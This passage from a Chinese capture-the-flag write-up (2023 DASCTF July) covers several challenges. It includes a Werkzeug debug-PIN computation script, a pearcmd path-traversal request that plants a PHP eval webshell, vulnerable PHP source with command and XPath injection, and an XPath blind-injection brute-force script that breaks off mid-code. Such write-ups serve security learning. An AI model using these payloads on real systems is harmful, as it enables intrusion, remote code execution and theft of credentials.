class="token punctuation">[</span>    <span class="token string">'root'</span><span class="token punctuation">,</span>    <span class="token string">'flask.app'</span><span class="token punctuation">,</span>    <span class="token string">'Flask'</span><span class="token punctuation">,</span>    <span class="token string">'/usr/local/lib/python3.10/site-packages/flask/app.py'</span><span class="token punctuation">]</span>mac <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'3e:a3:33:76:6f:cd'</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#/sys/class/net/eth0/address</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    mac<span class="token punctuation">,</span>     <span class="token string">'96cec10d3d9307792745ec3b85c89620docker-c647c1a8da0d432cdf87af77e028edfdd0709e41b4c6244064e0b23fd60ea0ea.scope'</span> <span class="token comment">#1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span><span class="token punctuation">]</span><span class="token comment">#96cec10d3d9307792745ec3b85c89620 867ab5d2-4e57-4335-811b-2943c662e936 docker-c647c1a8da0d432cdf87af77e028edfdd0709e41b4c6244064e0b23fd60ea0ea.scope</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>    rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h2><p>Y4tacker 师傅的文章</p><p><a class="link"   href="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%89%8D%E5%8F%B0RCE" >https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%89%8D%E5%8F%B0RCE<i class="fas fa-external-link-alt"></i></a></p><p>按照思路打是这个 payload</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/?+config-create+/&amp;r=../../../../../../../../../../../../../../../www/server/php/52/lib/php/pearcmd&amp;/&lt;?=@eval($_GET['shell']);?>+/tmp/hello.php</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">05c1eb98-7fcc-439c-be7c-3dade9e555df.node4.buuoj.cn:81</span></span><span class="token header"><span class="token header-name keyword">Pragma</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.183</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4,no;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再去做文件包含，但是实际做的时候发现这样子无法写🐎，怀疑是路径问题，Y4tacker 师傅说到这个路径其实是宝塔的，那 Linux 下一般 php 的路径都是 <code>/usr/bin/php</code>，pearcmd 的路径经过查询才知道是 <code>usr/share/php</code>麻了，当时一直在尝试其他思路，还以为 pearcmd 被删了。</p><p>写马</p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/writeEvilCode.png" class=""><p>连马</p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/flag2.png" class=""><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><p>搞源码，先在登录框输入 <code>123&#39;/123</code>，会能够在注释中看到源码</p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/source3.png" class=""><p>源码如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FILE</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$lasttime</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$size</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\//i"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">substr_count</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"???"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lasttime</span> <span class="token operator">=</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Filename: "</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">.</span> <span class="token string double-quoted-string">"  Last Modified Time: "</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lasttime</span><span class="token operator">.</span> <span class="token string double-quoted-string">"  Filesize: "</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ls -all "</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>MyPicDisk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;form method="POST">    username：&lt;input type="text" name="username">&lt;/p>    password：&lt;input type="password" name="password">&lt;/p>    &lt;input type="submit" value="登录" name="submit">&lt;/p>&lt;/form>'</span><span class="token punctuation">;</span>  <span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/tmp/secret.xml'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$x_query</span><span class="token operator">=</span><span class="token string double-quoted-string">"/accounts/user[username='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>' and password='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$password</span><span class="token punctuation">&#125;</span></span>']"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$xml</span><span class="token operator">-></span><span class="token function">xpath</span><span class="token punctuation">(</span><span class="token variable">$x_query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token string single-quoted-string">'登录失败'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>      <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('登录成功!');location.href='/index.php';&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('you are not admin!!!!!');&lt;/script>"</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>location.href='/index.php';&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;!-- /y0u_cant_find_1t.zip -->"</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.(jpg|jpeg|gif|png|bmp)$/i"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;a href='index.php/?file="</span> <span class="token operator">.</span> <span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'>"</span> <span class="token operator">.</span> <span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/a>&lt;br>"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'  &lt;form action="index.php" method="post" enctype="multipart/form-data">  选择图片：&lt;input type="file" name="file" id="">  &lt;input type="submit" value="上传">&lt;/form>  '</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.(jpg|jpeg|gif|png|bmp)$/i"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('图片上传成功!');location.href='/index.php';&lt;/script>"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span><span class="token punctuation">&#123;</span>      <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'todo'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"md5"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">echo</span> <span class="token function">md5_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>          <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FILE</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'todo'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"remove"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'todo'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"show"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='../"</span> <span class="token operator">.</span> <span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'>&lt;br>"</span><span class="token punctuation">;</span>              <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;a href='../index.php/?file="</span> <span class="token operator">.</span> <span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&amp;&amp;todo=remove'>remove&lt;/a>&lt;br>"</span><span class="token punctuation">;</span>              <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;a href='../index.php/?file="</span> <span class="token operator">.</span> <span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&amp;&amp;todo=show'>show&lt;/a>&lt;br>"</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'todo'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"remove"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('图片已删除!');location.href='/index.php';&lt;/script>"</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'todo'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"show"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处要先想办法获取 admin 的用户名和密码，但是这里的 xml 并不是我们可控的，所以用 xpath 盲注打，参考 </p><p><a class="link"   href="https://www.cnblogs.com/karsa/p/13439673.html" >NPUCTF2020 ezlogin<i class="fas fa-external-link-alt"></i></a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span><span class="token string">'http://d5dc6fdb-a73b-409d-8b67-121d712142dd.node4.buuoj.cn:81/index.php'</span>strs <span class="token operator">=</span><span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>flag <span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> strs<span class="token punctuation">:</span>        <span class="token comment">#猜测根节点名称</span>        <span class="token comment"># payload_1 = &#123;"username":"&lt;username>'or substring(name(/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>3123&lt;/password>".format(i,j),"password":123&#125;</span>        <span class="token comment">#猜测子节点名称</span>        <span class="token comment"># payload_2 = "&lt;username>'or substring(name(/root/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>&#123;&#125;&lt;/token>".format(i,j,token[0])</span>        <span class="token comment">#猜测accounts的节点</span>        <span class="token comment"># payload_3 ="&lt;username>'or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>&#123;&#125;&lt;/token>".format(i,j,token[0])</span>        <span class="token comment">#猜测user节点</span>        <span class="token comment"># payload_4 ="&lt;username>'or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)='&#123;&#125;'  or 